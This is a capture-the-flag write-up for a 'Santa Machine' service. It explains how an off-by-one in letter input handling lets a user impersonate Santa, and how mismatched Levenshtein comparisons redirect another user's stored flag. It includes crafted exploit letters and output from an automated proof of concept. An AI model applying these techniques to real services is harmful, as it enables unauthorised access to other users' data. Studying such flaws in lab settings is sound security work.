# Santa Machine

## Description

> It's almost Sinterklaas, make a wish and hope you've been nice this year!

This services is provided by the team *heks* and is actually composed of plenty
of scripts and binaries, written in different languages including python, perl
and bash.

As the service description indicates, christmas is coming and with it
Santa Claus. With the Santa Machine, you can write a letter to Santa Claus in
order for its elf team answer to your wish, but only if you've been nice.

The usage of this services is pretty simple:

1. Create an account
2. Login with the account
3. Write a letter to Santa
4. If you've been nice, Santa would answer to you

However, in order for this to work, your letter to Santa must follow a specific
format:

```
Dear Santa,
I'd like a PRESENT FOR CHRISTMAS.
Love,
username
```

You may change `PRESENT FOR CHRISTMAS` with any other wish, but `username` must
be the username of your account.

### Flag

Flag Description:

> You want a flag, but you can't just wish for it. Others want a flag too,
> so go steal theirs.

Flags are actually set through the letter to Santa. The user created by the
central server is then used ask Santa for the flag.

The *flag_id* associated is the username of the account used to send the
letter.



## Vulnerabilities

When writting a letter here is what happens:

```
                 ---
+--------+     /     \ No  +------+
| letter +--->| Nice? +--->| Stop |
+--------+     \     /     +------+
                 -+-
              Yes |    +----------+    +-------------+    +----------+
                  +--->| Template +--->| Get present +--->| Response |
                       +----------+    +-------------+    +----------+
```

1. You write your letter
2. An algorithm determine whether you've been nive
  * If not the process stops here
  * Else Santa sends a response
3. A Template of response is generated
4. The present asked in the letter is retrieved
5. It is used to replace `$PRESENT` in the template

The idea is thus to be able to send a letter as Santa which would includes
`$PRESENT` while tricking the system to retrieve the present of a desired user.

There are two parts in the scenario. First we must be able to send a letter as
Santa, then we must be able to trick the system to control the present to
retrieve.


### Impersonate Santa

Of course, we can't easily impersonate Santa because of 2 sanity checks.
First, we can't create an account in the name of Santa, then everytime you
write a letter, the machine checks the sender of the letter match the username.
To do so we must find a flaw to exploit.

Let's take a look at the treatment chain:

```
+--------------+    +----------------+    +------------------+    +----------+
| santamachine +--->| normalize.bash +--->| handle_letter.pl +--->| santa.py |
+--------------+    +----------------+    +------------------+    +--+-------+
                                                          ^          |
                                                          |          |
                                                          +----------+
```

* **santamachine** checks the sender of the letter with the username
* **normalize.bash** normalizes spaces in the letter, removing doubles and
removing spaces which precedes ponctuation.
* **handle_letter.pl** manage letters treatment by followinf these rules:
  - If the sender is `Santa`:
    + The reveiver is retrieved from `Dear XXXX,` in the response
    + The present is retrieved from `I'd like a XXXX.` in the wish letter
    + `$PRESENT` is replaced in the response

  - Else:
    + **santa.py** generates a response template
    + The letter template is forwarded to **handle_letter.pl**

The response template is:

```
Dear SENDER,

Since you've been nice this year, it looks like you'll be getting a $PRESENT.

Love,
Santa
```


The first stange thing we can find out is located in **santamachine**:

```python
print "Please type in your letter (max 10 lines). Use an empty line to indicate you're done."
sys.stdout.flush() # Note the flush calls!
wish = ""
for i in xrange(10):
  line = sys.stdin.readline(); wish += line
  if line.strip() == "": break
wish = wish[:-1]
```

The final `wish = wish[:-1]` is present to remove the last empty line we get
after breaking the loop. But if we complete the loop without breaking (ie. 
when reading 10 lines) it will only remove the trailing newline character 
('\n').

This can be exploited in **normalize.bash** to remove the entire last line:

```bash
while read -r; do
  line="${REPLY//  / }"; line="${line# }"; line="${line% }";
  line="${line// ,/,}"
  printf '%s\n' "$line"
done
```

In fact, `read` will get only lines which ends with a newline.

The last point we may take care of is the verification of the letter sender in
**santamachine**:

```python
username == letter.rstrip('\n').split('\n')[-1].lower
```

This verification is only performed against the last line of the letter, whether or
not it ends with newline.

Let's try to exploit this vulnerabilities with this letter:

```
Dear Jean
You may have your $PRESENT
3
4
5
6
7
Love,
Santa
myUsername
```

We then check Jean's inbox:

```
Dear Jean
You may have your pony
3
4
5
6
7
Love,
Santa
```

### Control the response letter

We can write a letter as Santa, but a problem remain. We want to retrieve the
present of one user and send the response to another we control.

The first thing is to understand how the receiver of the letter is handled, in
**handle_letter.pl**:

```perl
my $first               = substr($receiver, 0, 1);
my ($user, $score)      = (undef, 5);
$receiver =~ /\A[a-z0-9_]{0,40}\z/ or die "invalid username!";
foreach my $file (glob "letter.$first*") {
  if ($file =~ m!\Aletter\.([a-z0-9_]{0,40})\z!) {
    my $n = qx{ ../ro/magic $receiver $1 };
    $? eq 0 or die "magic failure!";
    if ($n le $score) { $user = $1; $score = $n; }
  }
}
```

We consider all username which starts with the same character as the receiver.
Then **magic** compute the levenshtein distance between each username and the 
receiver name. A search on [Wikipedia][levenshtein] explains everything about
it:

> Levenshtein distance between two words is the minimum number of
> single-character edits (i.e. insertions, deletions or substitutions) required
> to change one word into the other.

Reversing the binary confirms this use.

We may then understand how the present owner is handle in **present.bash**:

```bash
[[ "$letter" =~ ^Dear\ ([A-Za-z0-9_]+) ]] || exit 2
receiver="${BASH_REMATCH[1]}"; receiver="${receiver,,}"
user= score=99
for file in letter.${receiver:0:1}*; do
  u="${file:7}"; n="$( ../ro/magic "$receiver" "$u" )"
  echo "score=$score n=$n u=$u" >> out
  if (( n < score )); then user="$u" score="$n"; fi
done
[ -n "$user" ] || exit 3
present="$( grep -o "I'd"' like an\? \(.*\)\.' letter."$user" )"
present="${present#I\'d like a }"; echo "${present%.}"
```

The treatment is once again similar.

**However**, one thing is different:

In **handle_letter.pl**:

```perl
if ($n le $score) { $user = $1; $score = $n; }
```

In **present.bash**:

```bash
if (( n < score )); then user="$u" score="$n"; fi
```

The inegality is strict in **present.bash** but not in **handle_letter.pl**.
We'll use it to get a different receiver and present owner.

In term of levenshtein distance, we want the following:

```
------------             -------------             -------------
             \    1    /               \    1    /
present owner |<=====>| letter receiver |<=====>| real receiver
             /         \               /         \
------------             -------------             -------------
```

We'll send our letter as Santa to a non-existent user which would be
equidistant from the present owner and the user who would reveive the response.

In addition, the alphabetical order of usernames is important to get username
in a specific order after the globbing. In fact, the present owner must come
first to be selected when choosing the user for the present.


## Proof of Concept

We now know a complete attack scenario which will be used in this PoC.

### Manual proof

We want to steal *toto*'s flag. To do it, we'll use the user *tutu*:

```
Hi! Welcome to our 'Send a letter to Santa' service.
To use the service, you can (R)egister or (L)ogin to your account.
Want to (R)egister or (L)ogin?
R
Please type your desired: username password
tutu tutu
Your username and password has been saved!
```

Let's send a message as Santa to *tuto*:

```
Hi! Welcome to our 'Send a letter to Santa' service.
To use the service, you can (R)egister or (L)ogin to your account.
Want to (R)egister or (L)ogin?
L
Please type: username password
tutu tutu
Hi! You can finally send/read letters/responses to Santa!!!!
Here, you can read or write a letter, or read responses from Santa!
Choose (W) to write letter. (L) for reading letter. And (R) for reading responses.
W
Please type in your letter (max 10 lines). Use an empty line to indicate you're done.
Dear tuto,
Thanks for the flag: $PRESENT
3
4
5
6
77
Love,
Santa
tutu
Your letter to Santa has been saved!
It seems you have been nice! Wait for response from Santa.
```

Wonderful! As we've been nice, we can check Santa's response:

```
Hi! Welcome to our 'Send a letter to Santa' service.
To use the service, you can (R)egister or (L)ogin to your account.
Want to (R)egister or (L)ogin?
L 
Please type: username password
tutu tutu
Hi! You can finally send/read letters/responses to Santa!!!!
Here, you can read or write a letter, or read responses from Santa!
Choose (W) to write letter. (L) for reading letter. And (R) for reading responses.
R
Santa's response to your wish is:
Dear tuto,
Thanks for the flag: FLG0123456789abc
3
4
5
6
77
Love,
Santa

```

We've successful got the (dummy) flag.


### Automated PoC

A bash script, [poc.bash][poc], implements the same scenario to exploit
locally this vulnerability. It both set a random flag and retrieve it using the
flaws.

It's called locally as such:

```bash
cd /opt/ctf/santamachine/rw
/path/to/poc.bash ../ro/santamachine
```

After setting the flag, the exploit user and the letter receiver is computed.
To do so, one character is replaced by `z` for the later and a second character
for the other. These characters are the two final characters which are not `z`.

In order for our user to be considered nice, we also modify one useless line
of the letter until the letter is accepted.

We are then sure to receive the response from Santa which includes the flag.

Here is an output of the PoC script:

```
Create user kgkjwREg3A:Kqh9wmf1EbtUmPVvzq1t
Set flag FLG246P7sEKmq5Zp

Start exploit
Compute exploit username
Exploit user will be kgkjwREgzz

Register exploit user
Send exploit letter
Read response
The stolen flag is FLG246P7sEKmq5Zp
Flags match? ✓
```


[levenshtein]: https://en.wikipedia.org/wiki/Levenshtein_distance
[poc]: poc.bash
